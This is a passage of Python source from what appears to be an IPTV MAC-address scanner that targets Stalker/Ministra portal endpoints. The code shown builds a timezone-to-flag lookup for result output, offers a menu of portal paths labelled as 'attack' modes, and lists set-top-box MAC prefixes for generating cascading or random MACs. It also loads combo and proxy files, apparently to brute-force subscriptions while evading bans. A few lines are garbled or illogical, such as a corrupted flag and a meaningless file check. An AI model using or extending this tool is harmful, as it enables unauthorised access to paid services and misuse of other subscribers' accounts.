            vpntz = vpntz.replace('Europe/Rome', 'Europe/Rome 🇮🇹 Italy')
            vpntz = vpntz.replace('Europe/Jersey', 'Europe/Jersey 🇯🇪')
            vpntz = vpntz.replace('America/Jamaica', 'America/Jamaica 🇯🇲')
            vpntz = vpntz.replace('Asia/Amman', 'Asia/Amman 🇯🇴 Jordan')
            vpntz = vpntz.replace('Asia/Tokyo', 'Asia/Tokyo 🇯🇵 Japan')
            vpntz = vpntz.replace('Africa/Nairobi', 'Africa/Nairobi 🇰🇪 Kenya')
            vpntz = vpntz.replace('Asia/Bishkek', 'Asia/Bishkek 🇰🇬 Kyrgyzstan')
            vpntz = vpntz.replace('Asia/Phnom_Penh', 'Asia/Phnom Penh 🇰🇭 Cambodia')
            vpntz = vpntz.replace('Pacific/Tarawa', 'Pacific/Tarawa 🇰🇮 Kiribati')
            vpntz = vpntz.replace('Pacific/Enderbury', 'Pacific/Enderbury 🇰🇮 Kiribati')
            vpntz = vpntz.replace('Pacific/Kiritimati', 'Pacific/Kiritimati 🇰🇮 Kiribati')
            vpntz = vpntz.replace('Indian/Comoro', 'Indian/Comoro Islands 🇰🇲')
            vpntz = vpntz.replace('America/St_Kitts', 'America/Saint Kitts and Nevis 🇰🇳')
            vpntz = vpntz.replace('Asia/Pyongyang', 'Asia/Pyongyang 🇰🇵 North Korea')
            vpntz = vpntz.replace('Asia/Seoul', 'Asia/Seoul 🇰🇷 South Korea')
            vpntz = vpntz.replace('Asia/Kuwait', 'Asia/Kuwait 🇰🇼')
            vpntz = vpntz.replace('America/Cayman', 'America/Cayman Islands 🇰🇾')
            vpntz = vpntz.replace('Asia/Almaty', 'Asia/Almaty 🇰🇿 Kazakhstan')
            vpntz = vpntz.replace('Asia/Qyzylorda', 'Asia/Qyzylorda 🇰🇿 Kazakhstan')
            vpntz = vpntz.replace('Asia/Aqtobe', 'Asia/Aqtobe 🇰🇿 Kazakhstan')
            vpntz = vpntz.replace('Asia/Aqtau', 'Asia/Aqtau 🇰🇿 Kazakhstan')
            vpntz = vpntz.replace('Asia/Oral', 'Asia/Oral 🇰🇿 Kazakhstan')
            vpntz = vpntz.replace('Asia/Vientiane', 'Asia/Vientiane 🇱🇦 Laos')
            vpntz = vpntz.replace('Asia/Beirut', 'Asia/Beirut 🇱🇧 Lebanon')
            vpntz = vpntz.replace('America/St_Lucia', 'America/Saint Lucia 🇱🇨')
            vpntz = vpntz.replace('Europe/Vaduz', 'Europe/Vaduz 🇱🇮 Liechtenstein')
            vpntz = vpntz.replace('Asia/Colombo', 'Asia/Colombo 🇱🇰 Sri Lanka')
            vpntz = vpntz.replace('Africa/Monrovia', 'Africa/Monrovia 🇱🇷 Liberia')
            vpntz = vpntz.replace('Africa/Maseru', 'Africa/Maseru 🇱🇸 Lesotho')
            vpntz = vpntz.replace('Europe/Vilnius', 'Europe/Vilnius 🇱🇹 Lithuania')
            vpntz = vpntz.replace('Europe/Luxembourg', 'Europe/Luxembourg 🇱🇺')
            vpntz = vpntz.replace('Europe/Riga', 'Europe/Riga 🇱🇻 Latvia')
            vpntz = vpntz.replace('Africa/Tripoli', 'Africa/Tripoli 🇱🇾 Libya')
            vpntz = vpntz.replace('Africa/Casablanca', 'Africa/Casablanca 🇲🇦 Morocco')
            vpntz = vpntz.replace('Europe/Monaco', 'Europe/Monaco 🇲🇨')
            vpntz = vpntz.replace('Europe/Chisinau', 'Europe/Chisinau 🇲🇩 Moldova')
            vpntz = vpntz.replace('Europe/Podgorica', 'Europe/Podgorica 🇲🇪 Montenegro')
            vpntz = vpntz.replace('America/Marigot', 'America/Marigot 🇲🇫 Saint Martin')
            vpntz = vpntz.replace('Indian/Antananarivo', 'Indian/Antananarivo 🇲🇬 Madagascar')
            vpntz = vpntz.replace('Pacific/Majuro', 'Pacific/Majuro 🇲🇭 Marshall Islands')
            vpntz = vpntz.replace('Pacific/Kwajalein', 'Pacific/Kwajalein 🇲🇭 Marshall Islands')
            vpntz = vpntz.replace('Europe/Skopje', 'Europe/Skopje 🇲🇰 North Macedonia')
            vpntz = vpntz.replace('Africa/Bamako', 'Africa/Bamako 🇲🇱 Mali')
            vpntz = vpntz.replace('Asia/Rangoon', 'Asia/Rangoon 🇲🇲 Myanmar')
            vpntz = vpntz.replace('Asia/Ulaanbaatar', 'Asia/Ulaanbaatar 🇲🇳 Mongolia')
            vpntz = vpntz.replace('Asia/Hovd', 'Asia/Hovd 🇲🇳 Mongolia')
            vpntz = vpntz.replace('Asia/Choibalsan', 'Asia/Choibalsan 🇲🇳 Mongolia')
            vpntz = vpntz.replace('Asia/Macau', 'Asia/Macau 🇲🇴')
            vpntz = vpntz.replace('Pacific/Saipan', 'Pacific/Saipan 🇲🇵 Northern Mariana Islands')
            vpntz = vpntz.replace('America/Martinique', 'America/Martinique 🇲🇶')
            vpntz = vpntz.replace('Africa/Nouakchott', 'Africa/Nouakchott 🇲🇷 Mauritania')
            vpntz = vpntz.replace('America/Montserrat', 'America/Montserrat 🇲🇸')
            vpntz = vpntz.replace('Europe/Malta', 'Europe/Malta 🇲🇹')
            vpntz = vpntz.replace('Indian/Mauritius', 'Indian/Mauritius 🇲🇺')
            vpntz = vpntz.replace('Indian/Maldives', 'Indian/Maldives 🇲🇻')
            vpntz = vpntz.replace('Africa/Blantyre', 'Africa/Blantyre 🇲🇼 Malawi')
            vpntz = vpntz.replace('America/Mexico_City', 'America/Mexico City 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Cancun', 'America/Cancun 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Merida', 'America/Merida 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Monterrey', 'America/Monterrey 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Matamoros', 'America/Matamoros 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Mazatlan', 'America/Mazatlan 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Chihuahua', 'America/Chihuahua 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Ojinaga', 'America/Ojinaga 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Hermosillo', 'America/Hermosillo 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Tijuana', 'America/Tijuana 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Santa_Isabel', 'America/Santa Isabel 🇲🇽 Mexico')
            vpntz = vpntz.replace('America/Bahia_Banderas', 'America/Bahia Banderas 🇲🇽 Mexico')
            vpntz = vpntz.replace('Asia/Kuala_Lumpur', 'Asia/Kuala Lumpur 🇲🇾 Malaysia')
            vpntz = vpntz.replace('Asia/Kuching', 'Asia/Kuching 🇲🇾 Malaysia')
            vpntz = vpntz.replace('Africa/Maputo', 'Africa/Maputo 🇲🇿 Mozambique')
            vpntz = vpntz.replace('Africa/Windhoek', 'Africa/Windhoek 🇳🇦 Namibia')
            vpntz = vpntz.replace('Pacific/Noumea', 'Pacific/Noumea 🇳🇨 New Caledonia')
            vpntz = vpntz.replace('Africa/Niamey', 'Africa/Niamey 🇳🇪 Niger')
            vpntz = vpntz.replace('Pacific/Norfolk', 'Pacific/Norfolk Island 🇳🇫')
            vpntz = vpntz.replace('Africa/Lagos', 'Africa/Lagos 🇳🇬 Nigeria')
            vpntz = vpntz.replace('America/Managua', 'America/Managua 🇳🇮 Nicaragua')
            vpntz = vpntz.replace('Europe/Amsterdam', 'Europe/Amsterdam 🇳🇱 Netherlands')
            vpntz = vpntz.replace('Europe/Oslo', 'Europe/Oslo 🇳🇴 Norway')
            vpntz = vpntz.replace('Asia/Kathmandu', 'Asia/Kathmandu 🇳🇵 Nepal')
            vpntz = vpntz.replace('Pacific/Nauru', 'Pacific/Nauru 🇳🇷')
            vpntz = vpntz.replace('Pacific/Niue', 'Pacific/Niue 🇳🇺')
            vpntz = vpntz.replace('Pacific/Auckland', 'Pacific/Auckland 🇳🇿 New Zealand')
            vpntz = vpntz.replace('Pacific/Chatham', 'Pacific/Chatham 🇳🇿 New Zealand')
            vpntz = vpntz.replace('Asia/Muscat', 'Asia/Muscat 🇴🇲 Oman')
            vpntz = vpntz.replace('America/Panama', 'America/Panama 🇵🇦')
            vpntz = vpntz.replace('America/Lima', 'America/Lima 🇵🇪 Peru')
            vpntz = vpntz.replace('Pacific/Tahiti', 'Pacific/Tahiti 🇵🇫 French Polynesia')
            vpntz = vpntz.replace('Pacific/Marquesas', 'Pacific/Marquesas 🇵🇫 French Polynesia')
            vpntz = vpntz.replace('Pacific/Gambier', 'Pacific/Gambier 🇵🇫 French Polynesia')
            vpntz = vpntz.replace('Pacific/Port_Moresby', 'Pacific/Port_Moresby 🇵🇬 Papua New Guinea')
            vpntz = vpntz.replace('Asia/Manila', 'Asia/Manila 🇵🇭 Philippines')
            vpntz = vpntz.replace('Asia/Karachi', 'Asia/Karachi 🇵🇰 Pakistan')
            vpntz = vpntz.replace('Europe/Warsaw', 'Europe/Warsaw 🇵🇱 Poland')
            vpntz = vpntz.replace('America/Miquelon', 'America/Saint Pierre and Miquelon 🇵🇲')
            vpntz = vpntz.replace('Pacific/Pitcairn', 'Pacific/Pitcairn Islands 🇵🇳')
            vpntz = vpntz.replace('America/Puerto_Rico', 'America/Puerto Rico 🇵🇷')
            vpntz = vpntz.replace('Asia/Gaza', 'Asia/Gaza 🇵🇸 Palastinian Territories')
            vpntz = vpntz.replace('Asia/Hebron', 'Asia/Hebron 🇵🇸 Palastinian Territories')
            vpntz = vpntz.replace('Europe/Lisbon', 'Europe/Lisbon 🇵🇹 Portugal')
            vpntz = vpntz.replace('Atlantic/Madeira', 'Atlantic/Madeira 🇵🇹 Portugal')
            vpntz = vpntz.replace('Atlantic/Azores', 'Atlantic/Azores 🇵🇹 Portugal')
            vpntz = vpntz.replace('Pacific/Palau', 'Pacific/Palau 🇵🇼')
            vpntz = vpntz.replace('America/Asuncion', 'America/Asuncion 🇵🇾 Paraguay')
            vpntz = vpntz.replace('Asia/Qatar', 'Asia/Qatar 🇶🇦')
            vpntz = vpntz.replace('Indian/Reunion', 'Indian/Réunion 🇷🇪')
            vpntz = vpntz.replace('Europe/Bucharest', 'Europe/Bucharest 🇷🇴 Romania')
            vpntz = vpntz.replace('Europe/Belgrade', 'Europe/Belgrade 🇷🇸 Serbia')
            vpntz = vpntz.replace('Europe/Kaliningrad', 'Europe/Kaliningrad 🇷🇺 Russia')
            vpntz = vpntz.replace('Europe/Moscow', 'Europe/Moscow 🇷🇺 Russia')
            vpntz = vpntz.replace('Europe/Volgograd', 'Europe/Volgograd 🇷🇺 Russia')
            vpntz = vpntz.replace('Europe/Samara', 'Europe/Samara 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Yekaterinburg', 'Asia/Yekaterinburg 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Omsk', 'Asia/Omsk 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Novosibirsk', 'Asia/Novosibirsk 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Novokuznetsk', 'Asia/Novokuznetsk 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Krasnoyarsk', 'Asia/Krasnoyarsk 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Irkutsk', 'Asia/Irkutsk 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Yakutsk', 'Asia/Yakutsk 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Vladivostok', 'Asia/Vladivostok 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Sakhalin', 'Asia/Sakhalin 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Magadan', 'Asia/Magadan 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Kamchatka', 'Asia/Kamchatka 🇷🇺 Russia')
            vpntz = vpntz.replace('Asia/Anadyr', 'Asia/Anadyr 🇷🇺 Russia')
            vpntz = vpntz.replace('Africa/Kigali', 'Africa/Kigali 🇷🇼 Rwanda')
            vpntz = vpntz.replace('Asia/Riyadh', 'Asia/Riyadh 🇸🇦 Saudi Arabia')
            vpntz = vpntz.replace('Pacific/Guadalcanal', 'Pacific/Guadalcanal 🇸🇧 Solomon Islands')
            vpntz = vpntz.replace('Indian/Mahe', 'Indian/Mahe 🇸🇨 Seychelles')
            vpntz = vpntz.replace('Africa/Khartoum', 'Africa/Khartoum 🇸🇩 Sudan')
            vpntz = vpntz.replace('Europe/Stockholm', 'Europe/Stockholm 🇸🇪 Sweden')
            vpntz = vpntz.replace('Asia/Singapore', 'Asia/Singapore 🇸🇬')
            vpntz = vpntz.replace('Atlantic/St_Helena', 'Atlantic/Saint Helena 🇸🇭')
            vpntz = vpntz.replace('Europe/Ljubljana', 'Europe/Ljubljana 🇸🇮 Slovenia')
            vpntz = vpntz.replace('Arctic/Longyearbyen', 'Arctic/Longyearbyen 🇸🇯 Svalbard and Jan Mayen')
            vpntz = vpntz.replace('Europe/Bratislava', 'Europe/Bratislava 🇸🇰 Slovakia')
            vpntz = vpntz.replace('Africa/Freetown', 'Africa/Freetown 🇸🇱 Sierra Leone')
            vpntz = vpntz.replace('Europe/San_Marino', 'Europe/San Marino 🇸🇲')
            vpntz = vpntz.replace('Africa/Dakar', 'Africa/Dakar 🇸🇳 Senegal')
            vpntz = vpntz.replace('Africa/Mogadishu', 'Africa/Mogadishu 🇸🇴 Somalia')
            vpntz = vpntz.replace('America/Paramaribo', 'America/Paramaribo 🇸🇷 Suriname')
            vpntz = vpntz.replace('Africa/Juba', 'Africa/Juba 🇸🇸 South Sudan')
            vpntz = vpntz.replace('Africa/Sao_Tome', 'Africa/São Tomé and Príncipe 🇸🇹')
            vpntz = vpntz.replace('America/El_Salvador', 'America/El Salvador 🇸🇻')
            vpntz = vpntz.replace('America/Lower_Princes', 'America/Lower Princes 🇸🇽 Sint Maarten')
            vpntz = vpntz.replace('Asia/Damascus', 'Asia/Damascus 🇸🇾 Syria')
            vpntz = vpntz.replace('Africa/Mbabane', 'Africa/Mbabane 🇸🇿 Swaziland')
            vpntz = vpntz.replace('America/Grand_Turk', 'America/Grand Turk Turks and Caicos Islands 🇹🇨')
            vpntz = vpntz.replace('Africa/Ndjamena', 'Africa/Ndjamena 🇹🇩 Chad')
            vpntz = vpntz.replace('Indian/Kerguelen', 'Indian/Kerguelen 🇹🇫 French Southern Territories')
            vpntz = vpntz.replace('Africa/Lome', 'Africa/Lome 🇹🇬 Togo')
            vpntz = vpntz.replace('Asia/Bangkok', 'Asia/Bangkok 🇹🇭 Thailand')
            vpntz = vpntz.replace('Asia/Dushanbe', 'Asia/Dushanbe 🇹🇯 Tajikistan')
            vpntz = vpntz.replace('Pacific/Fakaofo', 'Pacific/Fakaofo 🇹🇰 Tokelau')
            vpntz = vpntz.replace('Asia/Dili', 'Asia/Dili 🇹🇱 Timor-Leste')
            vpntz = vpntz.replace('Asia/Ashgabat', 'Asia/Ashgabat 🇹🇲 Turkmenistan')
            vpntz = vpntz.replace('Africa/Tunis', 'Africa/Tunis 🇹🇳 Tunisia')
            vpntz = vpntz.replace('Pacific/Tongatapu', 'Pacific/Tongatapu 🇹🇴 Tonga')
            vpntz = vpntz.replace('Europe/Istanbul', 'Europe/Istanbul 🇹🇷 Turkey')
            vpntz = vpntz.replace('America/Port_of_Spain', 'America/Port of Spain 🇹🇹 Trinidad and Tobago')
            vpntz = vpntz.replace('Pacific/Funafuti', 'Pacific/Funafuti 🇹🇻 Tuvalu')
            vpntz = vpntz.replace('Asia/Taipei', 'Asia/Taipei 🇹🇼 Taiwan')
            vpntz = vpntz.replace('Africa/Dar_es_Salaam', 'Africa/Dar es Salaam 🇹🇿 Tanzania')
            vpntz = vpntz.replace('Europe/Kiev', 'Europe/Kiev 🇺🇦 Ukraine')
            vpntz = vpntz.replace('Europe/Uzhgorod', 'Europe/Uzhgorod 🇺🇦 Ukraine')
            vpntz = vpntz.replace('Europe/Zaporozhye', 'Europe/Zaporozhye 🇺🇦 Ukraine')
            vpntz = vpntz.replace('Europe/Simferopol', 'Europe/Simferopol 🇺🇦 Ukraine')
            vpntz = vpntz.replace('Africa/Kampala', 'Africa/Kampala 🇺🇬 Uganda')
            vpntz = vpntz.replace('Pacific/Johnston', 'Pacific/Johnston 🇺🇸 USA')
            vpntz = vpntz.replace('Pacific/Midway', 'Pacific/Midway 🇺🇸 USA')
            vpntz = vpntz.replace('Pacific/Wake', 'Pacific/Wake 🇺🇸 USA')
            vpntz = vpntz.replace('America/New_York', 'America/New York 🇺🇸 USA')
            vpntz = vpntz.replace('America/Detroit', 'America/Detroit 🇺🇸 USA')
            vpntz = vpntz.replace('America/Kentucky/Louisville', 'America/Kentucky/Louisville 🇺🇸 USA')
            vpntz = vpntz.replace('America/Kentucky/Monticello', 'America/Kentucky/Monticello 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Indianapolis', 'America/Indiana/Indianapolis 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Vincennes', 'America/Indiana/Vincennes 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Winamac', 'America/Indiana/Winamac 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Marengo', 'America/Indiana/Marengo 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Petersburg', 'America/Indiana/Petersburg 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Vevay', 'America/Indiana/Vevay 🇺🇸 USA')
            vpntz = vpntz.replace('America/Chicago', 'America/Chicago 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Tell_City', 'America/Indiana/Tell City 🇺🇸 USA')
            vpntz = vpntz.replace('America/Indiana/Knox', 'America/Indiana/Knox 🇺🇸 USA')
            vpntz = vpntz.replace('America/Menominee', 'America/Menominee 🇺🇸 USA')
            vpntz = vpntz.replace('America/North_Dakota/Center', 'America/North Dakota/Center 🇺🇸 USA')
            vpntz = vpntz.replace('America/North_Dakota/New_Salem', 'America/North Dakota/New Salem 🇺🇸 USA')
            vpntz = vpntz.replace('America/North_Dakota/Beulah', 'America/North Dakota/Beulah 🇺🇸 USA')
            vpntz = vpntz.replace('America/Denver', 'America/Denver 🇺🇸 USA')
            vpntz = vpntz.replace('America/Boise', 'America/Boise 🇺🇸 USA')
            vpntz = vpntz.replace('America/Shiprock', 'America/Shiprock 🇺🇸 USA')
            vpntz = vpntz.replace('America/Phoenix', 'America/Phoenix 🇺🇸 USA')
            vpntz = vpntz.replace('America/Los_Angeles', 'America/Los Angeles 🇺🇸 USA')
            vpntz = vpntz.replace('America/Anchorage', 'America/Anchorage ??🇸 USA')
            vpntz = vpntz.replace('America/Juneau', 'America/Juneau 🇺🇸 USA')
            vpntz = vpntz.replace('America/Sitka', 'America/Sitka 🇺🇸 USA')
            vpntz = vpntz.replace('America/Yakutat', 'America/Yakutat 🇺🇸 USA')
            vpntz = vpntz.replace('America/Nome', 'America/Nome 🇺🇸 USA')
            vpntz = vpntz.replace('America/Adak', 'America/Adak 🇺🇸 USA')
            vpntz = vpntz.replace('America/Metlakatla', 'America/Metlakatla 🇺🇸 USA')
            vpntz = vpntz.replace('Pacific/Honolulu', 'Pacific/Honolulu 🇺🇸 USA')
            vpntz = vpntz.replace('America/Montevideo', 'America/Montevideo 🇺🇾 Uruguay')
            vpntz = vpntz.replace('Asia/Samarkand', 'Asia/Samarkand 🇺🇿 Uzbekistan')
            vpntz = vpntz.replace('Asia/Tashkent', 'Asia/Tashkent 🇺🇿 Uzbekistan')
            vpntz = vpntz.replace('Europe/Vatican', 'Europe/Vatican City State 🇻🇦')
            vpntz = vpntz.replace('America/St_Vincent', 'America/Saint Vincent and the Grenadines 🇻🇨')
            vpntz = vpntz.replace('America/Caracas', 'America/Caracas 🇻🇪 Venezuela')
            vpntz = vpntz.replace('America/Tortola', 'America/Tortola 🇻🇬 British Virgin Islands')
            vpntz = vpntz.replace('America/St_Thomas', 'America/Saint Thomas 🇻🇮 US Virgin Islands')
            vpntz = vpntz.replace('Asia/Ho_Chi_Minh', 'Asia/Ho Chi Minh 🇻🇳 Vietnam')
            vpntz = vpntz.replace('Pacific/Efate', 'Pacific/Efate 🇻🇺 Vanuatu')
            vpntz = vpntz.replace('Pacific/Wallis', 'Pacific/Wallis and Futuna 🇼🇫')
            vpntz = vpntz.replace('Pacific/Apia', 'Pacific/Apia 🇼🇸 Samoa')
            vpntz = vpntz.replace('Asia/Aden', 'Asia/Aden 🇾🇪 Yemen')
            vpntz = vpntz.replace('Indian/Mayotte', 'Indian/Mayotte 🇾🇹')
            vpntz = vpntz.replace('Africa/Johannesburg', 'Africa/Johannesburg 🇿🇦 South Africa')
            vpntz = vpntz.replace('Africa/Lusaka', 'Africa/Lusaka 🇿🇲 Zambia')
            vpntz = vpntz.replace('Africa/Harare', 'Africa/Harare 🇿🇼 Zimbabwe')
            clipad = veri.split('ip": "')[1]
            clipad = clipad.split('"')[0]
            vpn = '»' + clipad + '«' + '\n┣❖Continent⇥' + vpncont + '\n┣❖Country⇥ ' + vpnips + ' ✮ ' + data_server(vcountry) + '\n┣❖Region⇥ ' + vpnreg + '\n┣❖City⇥ ' + vpnc + '\n┣❖Client ISP⇥' + clisp + '\n┣❖︎Tᴢᴏɴᴇ⇥ ' + vpntz
        else:
            vpn = 'ᴀɴᴏɴʏᴍᴏᴜꜱ'
    return vpn

import socket
print()
ban = ''
uzmanm = 'portal.php'
realblue = ''
reqs = ('portal.php', 'c/portal.php', 'server/load.php', 'portal.php - No Ban', 'portal.php - Real Blue', 'portal.php - httpS', 'stalker_portal/server/load.php', 'stalker_portal/server/load.php - old', 'stalker_portal/server/load.php - «▣»', 'stalker_portal/server/load.php - httpS', 'ministra/portal.php', 'powerfull/portal.php', 'portalstb/portal.php', 'magaccess/portal.php', 'bs.mag.portal.php', 'portalcc.php', 'magLoad.php', 'stalke.php', 'delko/portal.php', 'rmxportal/portal.php', 'cmdforex/portal.php', 'c/server/load.php')
os.system('clear')
subprocess.run([
    'clear',
    ''])
print(ckiptv)
print('')
say = 0
for i in reqs:
    say = say + 1
    print(str(say) + ' \33[1;32m\33[1m=⫸ \33[0m \33[38;5;226m' + str(i) + '\33[0m')

say = 0
uzmanm = input('\n\n\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mSELECT YOUR PORTAL TYPE...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mNUMBER:\33[0m\33[1;90m ')
if uzmanm == '0':
    uzmanm = input(' Write request =⫸ \33[0m')
if uzmanm == '':
    uzmanm = 'portal.php'
uzmanm = reqs[int(uzmanm) - 1]
if uzmanm == 'stalker_portal/server/load.php - old':
    stalker_portal = '2'
    uzmanm = 'stalker_portal/server/load.php'
if uzmanm == 'stalker_portal/server/load.php - «▣»':
    stalker_portal = '1'
    uzmanm = 'stalker_portal/server/load.php'
if uzmanm == 'portal.php - No Ban':
    ban = 'ban'
    uzmanm = 'portal.php'
http = 'http'
if uzmanm == 'portal.php - Real Blue':
    realblue = 'real'
    uzmanm = 'portal.php'
if uzmanm == 'portal.php - httpS':
    uzmanm = 'portal.php'
    http = 'https'
if uzmanm == 'stalker_portal/server/load.php - httpS':
    uzmanm = 'stalker_portal/server/load.php'
    http = 'https'
print(uzmanm)
if uzmanm == 'powerfull/portal.php':
    uzmanm = 'powerfull/portal.php'
if uzmanm == 'portalstb/portal.php':
    uzmanm = 'portalstb/portal.php'
if uzmanm == 'magaccess/portal.php':
    uzmanm = 'magaccess/portal.php'
if uzmanm == 'bs.mag.portal.php':
    uzmanm = 'bs.mag.portal.php'
if uzmanm == 'portalcc.php':
    uzmanm = 'portalcc.php'
if uzmanm == 'magLoad.php':
    uzmanm = 'magLoad.php'
if uzmanm == 'ministra/portal.php':
    uzmanm = 'ministra/portal.php'
if uzmanm == 'stalke.php':
    uzmanm = 'stalke.php'
if uzmanm == 'delko/portal.php':
    uzmanm = 'delko/portal.php'
if uzmanm == 'rmxportal/portal.php':
    uzmanm = 'rmxportal/portal.php'
if uzmanm == 'cmdforex/portal.php':
    uzmanm = 'cmdforex/portal.php'
if uzmanm == 'c/server/load.php':
    uzmanm = 'c/server/load.php'
panel = panel.replace('stalker_portal', '')
panel = panel.replace('http://', '')
panel = panel.replace('/c/', '')
panel = panel.replace('/c', '')
panel = panel.replace('/', '')
panel = panel.replace(' ', '')
attack = ''
if uzmanm == 'portal.php':
    attack = 'sᴛʙ ⁿᵒʳᵐᵃˡ'
if uzmanm == 'c/portal.php':
    attack = 'sᴛʙ ᴺˣᵀ'
if uzmanm == 'server/load.php':
    attack = 'sᴛʙ ˢᴸ⁻ᵁˡᵗʳᵃ'
if ban == 'ban':
    attack = 'sᴛʙ ˣᵁᴵ'
if realblue == 'real':
    attack = 'sᴛʙ ᴿᴮ⁻ᵉ'
if uzmanm == 'stalker_portal/server/load.php':
    attack = 'sᴛʙ/stalker ⁿᵒʳᵐᵃˡ'
if stalker_portal == '2':
    attack = 'sᴛʙ/stalker ᶜᵘˢᵗᵒᵐ'
if stalker_portal == '1':
    attack = 'sᴛʙ/stalker ᴬᴸᴸ'
if http == 'https':
    attack = attack + '⁻ˢ'
if uzmanm == 'ministra/portal.php':
    attack = 'sᴛʙ ᴹⁱⁿⁱˢᵗʳᵃ'
if uzmanm == 'powerfull/portal.php':
    attack = 'sᴛʙ ᴾ⁻ᶠᵘˡˡ'
if uzmanm == 'portalstb/portal.php':
    attack = 'sᴛʙ ˢᵗᵇ'
if uzmanm == 'magaccess/portal.php':
    attack = 'sᴛʙ ᴹ⁻ᵃᶜᶜᵉˢ'
if uzmanm == 'bs.mag.portal.php':
    attack = 'sᴛʙ ᴮˢ'
if uzmanm == 'portalcc.php':
    attack = 'sᴛʙ ᶜᶜ'
if uzmanm == 'magLoad.php':
    attack = 'sᴛʙ ᴹᵍᴸ⁻ᵘˡᵗʳᵃ'
if uzmanm == 'stalke.php':
    attack = 'sᴛʙ ˢᵗ⁻ᵁˡᵗʳᵃ'
if uzmanm == 'delko/portal.php':
    attack = 'sᴛʙ ᵈᵉˡᵏᵒ'
if uzmanm == 'rmxportal/portal.php':
    attack = 'sᴛʙ ᴿᵐ⁻ᵁˡᵗʳᵃ'
if uzmanm == 'cmdforex/portal.php':
    attack = 'sᴛʙ ᶜᵐ⁻ᵁˡᵗʳᵃ'
if uzmanm == 'c/server/load.php':
    attack = "sᴛʙ ᶜ'ˢᴸ⁻ᵁˡᵗʳᵃ"
import urllib3
import os

def temizle():
    os.system('clear')

yeninesil = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:', '1A:00:FB:', '00:A1:79:', '00:1B:79:', '00:2A:79:', '18:C8:E7:')
comboc = ''
combototLen = ''
combouz = 0
combodosya = 'ᴄᴜsᴛᴏᴍ-ᴍᴀᴄs'
proxyc = ''
proxytotLen = ''
proxydosya = ''
proxyuz = 0
statusproxy = ''
os.system('clear')
subprocess.run([
    'clear',
    ''])

def dosyasec():
    global mactur, mactur, randomturu, randomturu, serim, serim, mactur, serim, seri, combouz, combouz, combouz, randommu, combodosya, combodosya, comboc, combototLen, combouz, comboc, proxydosya, proxyc, proxytotLen, proxyuz, statusproxy
    say = 0
    dsy = ''
    if comboc == '':
        os.system('clear')
        subprocess.run([
            'clear',
            ''])
        print(ckiptv)
        mesaj = 'ENTER YOUR COMBO NUMBER'
        dir = '/sdcard/SPX/Combo/'
        dsy = ' \33[91m0\33[1;32m = AUTO MAC MODE\33[0m\n'
    else:
        os.system('clear')
        subprocess.run([
            'clear',
            ''])
        print(ckiptv)
        mesaj = 'Select your proxies!'
        dir = '/sdcard/SPX/Proxy/'
    if not os.path.exists(dir):
        os.mkdir(dir)
    for files in os.listdir(dir):
        say = say + 1
        dsy = dsy + ' \33[91m' + str(say) + ' \33[1;32m= \33[0m\33[36m' + files + '\33[0m\n'
    
    print('\n[SELECT YOUR FILE]\n\n' + dsy + '\n\33[38;5;226mFound ' + str(say) + '.txt combo files. \33[0m\n')
    dsyno = str(input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33m' + mesaj + '...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mCOMBO:\33[0m\33[1;90m '))
    if dsyno == '':
        dsyno = '0'
    say = 0
    for files in os.listdir(dir):
        say = say + 1
        if dsyno == str(say):
            dosya = dir + files
            break
    subprocess.run([
        'clear',
        ''])
    print(ckiptv)
    say = 0
    
    try:
        if not dosya == '9797979790797977979':
            print()
        else:
            print('Incorrect file selection!')
            quit()
    except:
        print('\n\33[1m\33[38;5;231m  Select mac type!\n')
        if comboc == '':
            if dsyno == '0' or dsyno == '':
                nnesil = str(yeninesil)
                nnesil = nnesil.count(',') + 1
                for xd in range(0, nnesil):
                    tire = ' >> '
                    if int(xd) < 9:
                        tire = '  >> '
                    print(' \33[38;5;1m\33[1m' + str(xd + 1) + '\33[1;32m\33[1m' + tire + '\33[36m\33[1m' + yeninesil[xd])
                
                mactur = input('\n    \33[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\33[38;5;231m ')
#                print('\33[H\33[J', '', **('end',))
                print(ckiptv)
                if mactur == '':
                    mactur = 1
                randomturu = input('\n   \33[1m\33[38;5;231m Select mac combination type! \33[0m\n\t\t\t\t\t\n\33[36m\33[1m    1 = Cascading mac\n    2 = Random mac \33\n   \n    \33[38;5;1m\33[1mAɴꜱᴡᴇʀ =\33[1m\33[38;5;231m ')
#                print('\33[H\33[J', '', **('end',))
                subprocess.run([
                    'clear',
                    ''])
                print(ckiptv)
                if randomturu == '':
                    randomturu = '2'
                serim = ''
